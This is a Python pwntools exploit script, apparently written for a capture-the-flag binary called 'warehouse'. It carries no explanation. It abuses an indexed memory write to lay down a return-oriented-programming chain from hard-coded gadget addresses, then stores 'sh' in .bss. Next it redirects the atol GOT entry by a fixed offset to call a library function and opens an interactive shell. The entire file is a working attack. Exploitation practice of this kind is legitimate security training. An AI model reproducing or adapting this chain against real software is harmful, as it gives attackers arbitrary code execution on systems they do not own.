from pwn import *
import sys, time
from binascii import *

context.binary = "./warehouse"
binary = ELF("./warehouse")

p = process(["./warehouse"])
prog = log.progress("Exploit ")


def ex(offset, value):
    p.sendline(str(offset))
    time.sleep(0.1)
    p.sendline(str(value))
    time.sleep(0.1)

pop3ret = 0x080486ad
pop1eax = 0x08048539    # pop eax; ret; 
mov1 = 0x0804850e       # mov dword ptr [edx], eax; pop ebp; ret;
mov2 = 0x08048509       # add edx, eax; mov eax, dword ptr [ebp + 0x10]; mov dword ptr [edx], eax; pop ebp; ret;
add = 0x08048537        # add eax, dword ptr [eax + ebx*2]; ret; 
call = 0x08048463       # call eax; 
pop1ebx = 0x0804837d    # pop ebx; ret; 
store = 0x80484fb

stdin = 0x08049920
bss = 0x8049a00
JMPREL = 0x8048324
SYMTAB = 0x80481b0
STRTAB = 0x8048250
offset = 0xdb30

ex(71 , 0x41414141)      # ebp
ex(72 , store)
ex(73 , pop3ret)
ex(74 , bss) 
ex(75 , 3)
ex(76 , 0x00006873)
ex(77 , pop1eax)
ex(78 , offset)
ex(79 , pop1ebx)
ex(80 , (binary.got["atol"] - offset) / 2)
ex(81 , add)
ex(82 , call)
ex(83 , bss + 12)
pause()
p.sendline(".")

p.interactive()
